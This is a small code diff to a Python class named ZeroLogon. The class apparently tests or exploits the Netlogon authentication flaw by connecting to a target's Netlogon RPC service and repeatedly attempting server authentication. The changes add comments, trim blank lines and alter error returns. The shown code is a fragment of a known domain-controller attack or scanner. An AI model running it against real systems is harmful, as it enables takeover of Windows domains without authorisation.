@@ -18,6 +18,8 @@ class ZeroLogon():
   def run(self):
     ''' Launch a Netlogon authentication attempt against the target.'''
 
+
+    # RPC Connection
     try:
       # Connect to netlogon service.
       binding = epm.hept_map(self.ipaddress, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
@@ -33,8 +35,9 @@ class ZeroLogon():
       nrpc.hNetrServerReqChallenge(rpc_con, self.host_handle + '\x00', self.hostname + '\x00', plaintext)
     except nrpc.DCERPCException as e:
       pass
-      logging.debug(f'DEV{e}')
+      return e
 
+    # RPC Authentication
     try:
       server_auth = nrpc.hNetrServerAuthenticate3(
         rpc_con, self.host_handle + '\x00', self.hostname + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
@@ -43,7 +46,6 @@ class ZeroLogon():
     except nrpc.DCERPCSessionError as e:
       # Debug print -  RPC response code.
       logging.debug(f'{e}')
-      
       # RPC response code: NRPC SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED.
       if e.get_error_code() == 0xc0000022:
         return 0xc0000022
@@ -57,5 +59,4 @@ class ZeroLogon():
     
     else:
       assert server_auth['ErrorCode'] == 0
-      
       return rpc_con
